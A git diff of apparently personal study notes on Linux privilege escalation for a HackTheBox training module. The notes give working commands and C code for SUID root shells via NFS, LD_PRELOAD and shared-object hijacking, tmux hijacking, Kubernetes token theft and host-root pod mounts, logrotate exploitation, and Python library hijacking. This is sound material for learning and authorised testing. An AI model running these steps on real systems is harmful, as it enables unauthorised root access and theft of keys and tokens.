@@ -1,7 +1,4 @@
 
-## Environment Enumeration
-
-
 ## Linux Services & Internals Enumeration
 
 ### Network Interfaces
@@ -287,7 +284,7 @@ This group grants us read access to all log files under `/var/log`, we can searc
 
 search for a string in the logs
 ```shell
-grep -rni "password"
+grep -rni "password" /var/log/*
 ```
 
 ### Capabilities
@@ -494,5 +491,363 @@ cat /etc/exports
 we can create a malicious script that executes `/bin/bash` and set the SUID bit, so when the low privileged user execute it, it will run `/bin/bash` as the `root` user.
 
 ```shell
+cat shell.c
 
+
+#include <stdio.h>
+#include <sys/types.h> 
+#include <unistd.h> 
+#include <stdlib.h> 
+int main(void) { 
+setuid(0); setgid(0); system("/bin/bash"); 
+}
 ```
+
+compile it
+```shell
+gcc -o shell shell.c
+```
+
+mount the share 
+```shell
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+```
+
+we can then execute the `shell` script as the unprivileged user and gain a bash shell as root. 
+
+#### Hijacking Tmux Sessions
+In case we find a Tmux session running, it is worth hijacking because we may find that is holds a root session. We can hijack a Tmux session using the following commands.
+```shell
+tmux -S /shareds new -s debugsess
+chown root:devs /shareds
+```
+
+if we compromise a user in the `devs` group we can attach to this session and gain root access
+
+Check for any running `tmux` processes.
+```shell
+ps aux | grep tmux
+```
+
+Finally, attach to the `tmux` session
+```shell
+tmux -S /shareds
+```
+### Kubernetes
+[[Kubernetes|Learn more about K8s here]]. We can interact with the service's API through port 10250.
+
+extracting pods with `curl`
+```shell
+curl <TARGET_IP>:10250/pods -k | jq .
+```
+
+extracting pods with `kubeletctl`
+```shell
+kubeletctl -i --server <TARGET_IP> pods
+```
+
+after fetching the pods in the system, we can scan for pods vulnerable to RCE
+```shell
+kubeletctl -i --server <TARGET_IP> scan rce
+```
+
+in case there are pods vulnerable to RCE, we can interact with them
+```shell
+kubeletctl -i --server <TARGET_IP> exec "id" -p <POD> -c <CONTAINER>
+```
+
+**Privilege Escalation**: after gaining access to a pod, we need to fetch the token and certificate.
+
+get the pod's token
+```shell
+kubeletctl -i --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+```
+
+get the pod's certificate
+```shell
+kubeletctl --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+```
+
+in case we have both the token and cert, we can check our service account's permissions
+```shell
+export token=`cat k8.token`
+
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 auth can-i --list
+```
+
+in case we can create a container inside the pod, we can create one and mount the root of the host's filesystem using the following YAML
+```yaml
+apiVersion: v1 
+kind: Pod 
+metadata: 
+	name: privesc 
+	namespace: default 
+spec: containers: 
+	- name: privesc 
+	image: nginx:1.14.2 
+volumeMounts: 
+	- mountPath: /root 
+	name: mount-root-into-mnt 
+volumes: 
+	- name: mount-root-into-mnt 
+	hostPath: 
+	path: / 
+automountServiceAccountToken: true 
+hostNetwork: true
+```
+
+then create the pod
+```shell
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 apply -f privesc.yaml
+```
+
+check the pod we created
+```shell
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 get pods
+```
+
+if the pod is successfully created, we can grab the SSH key of a user or do further enumeration on the host
+```shell
+kubeletctl --server <TARGET_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+```
+
+### Logrotate
+
+`Logrotate` has many features for managing these log files. These include the specification of:
+
+- the `size` of the log file,
+- its `age`,
+- and the `action` to be taken when one of these factors is reached.
+
+This tool is started periodically via `cron`, and controlled via the config file at `/etc/logrotate.conf`. To force a new rotation on the same day, we can use the `-f` or `--force` option, or set the date in `/var/lib/logrotate.status`. We can find the corresponding configuration files in `/etc/logrotate.d/`.
+
+To exploit `logrotate`, we need some requirements that we have to fulfill.
+
+1. we need `write` permissions on the log files
+2. logrotate must run as a privileged user or `root`
+3. vulnerable versions:
+    - 3.8.6
+    - 3.11.0
+    - 3.15.0
+    - 3.18.0
+
+We can use [logrotten](https://codeberg.org/whotwagner/logrotten) to automate the exploitation, we can either download it and compile it on the target machine if we have compilation capabilities or we can compile it on a machine which has the same kernel version as the target. 
+
+We need to ready the payload, we can use a simple bash reverse shell. Before that we need to check which option `logrotate` uses
+```shell
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+```
+
+in case it uses `create` or `compare` we use the exploit adapted to this option.
+```shell
+./logrotten -p ./payload /tmp/tmp.log
+```
+
+in the academy module machine, you had a file in `~/backups` named `access.log` and another named `access.log.1`. You DON'T have a `logrotate.conf` file and you can't force the logrotation using `-f` or by modifying the `logrotate.status` file. You can actually force logrotation by just writing to `access.log`, it is better to copy the contents of `access.log.1` to `access.log` because the contents of the former met the logrotation conditions. You can write a payload like `bash -c 'chmod +s /bin/bash'`, and the final command should be
+```shell
+./logrotten -p ./payload ~/backups/access.log
+```
+
+Make sure to specify the full path of the log file because `logrotten` creates a symlink between the log directory and `/etc/bash_completion.d` which holds bash completion scripts that are sourced into the shell on each login.
+
+## Linux Internals-Based Privilege Escalation
+
+### Kernel Exploits
+as the name suggests, we are targeting the kernel to execute code as the root user. It's as simple as searching the kernel version, downloading the exploit and compiling it.
+
+get kernel version
+```shell
+uname -a
+```
+
+get information about the distribution
+```shell
+cat /etc/lsb-release
+```
+
+after that we search for the kernel version, download it, compile it and run it.
+
+
+### LD_PRELOAD
+you can get an overview about shared libraries in the [HackTheBox module](https://academy.hackthebox.com/app/module/51/section/475). Here I am gonna focus on PE.
+
+"the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones."
+
+check user's sudo permissions
+```shell
+Matching Defaults entries for htb-student on NIX02:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User htb-student may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/bin/openssl
+```
+
+we see that our user can run `openssl` and we notice the `env_keep+=LD_PRELOAD` variable, we can abuse this by creating a library file and specify it when executing `openssl` as sudo. The following library code may be used
+```C
+#include <stdio.h> 
+#include <sys/types.h> 
+#include <stdlib.h> 
+#include <unistd.h> 
+void _init() { 
+unsetenv("LD_PRELOAD"); 
+setgid(0); 
+setuid(0); 
+system("/bin/bash"); 
+}
+```
+
+we can then compile the library
+```shell
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+```
+
+finally execute the `openssl` binary as root while specifying the library we created
+```shell
+sudo LD_PRELOAD=/tmp/root.so openssl
+```
+
+### Shared Object Hijacking
+Let's say that we have a binary with SUID bit set
+```shell
+ls -la payroll 
+
+-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll
+```
+
+we can use `ldd` to print the shared object required by the binary
+```shell
+ldd payroll 
+
+linux-vdso.so.1 => (0x00007ffcb3133000) 
+libshared.so => /development/libshared.so (0x00007f0c13112000) 
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000) 
+/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
+```
+
+we find that `libshared.so` is not a standard Linux library and it's in the `development` directory. it is possible to load shared libraries from custom locations, One such setting is `RUNPATH`. We can use the `readelf` utility to see the configuration of a binary, in our case we search for the word `PATH` and check the custom libraries path
+```shell
+readelf -d payroll | grep PATH
+
+0x000000000000001d (RUNPATH) Library runpath: [/development]
+```
+
+The binary calls functions from the shared library, so we need to get the name of the function in the library called by the binary, we can copy `/lib/x86_64-linux-gnu/libc.so.6` to `libshared.so` and run the binary and view the error
+```shell
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+
+./payroll 
+
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+```
+
+the function name is `dbquery`, we can now compile our own library with a function named `dbquery`. the name of our library is `libshared.c`
+```C
+#include<stdio.h> 
+#include<stdlib.h> 
+#include<unistd.h> 
+void dbquery() { 
+printf("Malicious library loaded\n"); 
+setuid(0); 
+system("/bin/sh -p"); 
+}
+```
+
+compile 
+```shell
+gcc libshared.c -fPIC -shared -o /development/libshared.so
+```
+
+so essentially we want to replace the original `libshared.so` object with ours.
+
+>[!note]
+>before replacing the original `libshared.so` object, copy it so you can revert the changes after the engagement.
+
+>[!tldr]
+>in case you have write access over the custom libraries directory but don't have write access over the library (.so) file itself, you can create a file with the same name and move it to the custom libraries directory, this will bypass the permissions to write.
+
+### Python Library Hijacking
+python scripts import libraries using the `import` keyword, the interpreter searches for a python file with the same name as the import
+```python
+import time
+
+time.sleep(9)
+```
+
+the interpreter in this case searches for `time.py` in the "search path". we can view the search path with the command
+```shell
+python3 -c 'import sys; print("\n".join(sys.path))'
+```
+
+the above command will output a list of directories, the interpreter will start searching from the top to the bottom.
+##### Library File Misconfigured Permissions
+We notice that the script calls the `sleep()` function, we can search for that function in the system
+
+get the location of the module
+```shell
+pip show time
+
+/usr/local/lib/python3.8/dist-packages 
+```
+
+search for all occurences
+```shell
+grep -r "def sleep" /usr/local/lib/python3.8/dist-packages/time/*
+```
+ 
+if our user has write access on one of the files (i.e. `__init__.py`) we can write our code inside the `sleep` function in that file, then our original script will import that library and call the function and hence, execute our code.
+
+#### Library Search Path Hijacking
+We know the search path for the python interpreter using the above command. Now we want to check the location of the `sleep` module in that list
+```shell
+python3 -c 'import sys; print("\n".join(sys.path))'
+
+/usr/lib/python38.zip 
+/usr/lib/python3.8 
+/usr/lib/python3.8/lib-dynload 
+/usr/local/lib/python3.8/dist-packages 
+/usr/lib/python3/dist-packages
+```
+
+and let's check where our module is installed
+```shell
+pip show time
+
+/usr/local/lib/python3.8/dist-packages 
+```
+
+we can check `/usr/lib/python3.8` for write permissions
+```shell
+ls -al /usr/lib/python3.8
+
+drwxr-xrwx 30 root root 20480 Dec 14 16:26 .
+```
+
+we've met the two conditions for search path hijacking
+1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
+2. We must have write permissions to one of the paths having a higher priority on the list. (i.e. /usr/lib/python3.8)
+
+Now we can create a file named `time.py` and put it in `/usr/lib/python3.8` and the interpreter will hit it before the actual library file
+```shell
+echo '#!/usr/bin/python\nimport os\n def sleep():\n  os.popen("id")' > /usr/lib/python3.8/time.py
+```
+
+#### PYTHONPATH Environment Variable
+The `PYTHONPATH` environment variable tells the interpreter which directories to search in. If we can control it, we can direct the interpreter to a directory we have write permissions over like `/tmp`.
+```shell
+sudo -l Matching Defaults entries for htb-student on ACADEMY-LPENIX: 
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
+
+User htb-student may run the following commands on ACADEMY-LPENIX:
+(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+```
+
+we can run `/usr/bin/python3` as root without a password (`NOPASSWD:`) and we can define an environment variable (`SETENV:`). We can now issue the following command
+```shell
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+```
+
+the `PYTHONPATH` variable points to `/tmp` which means we need a file named `time.py` in `/tmp`. The script will call the `time` module and the interpreter will search for it in the `/tmp` directory.
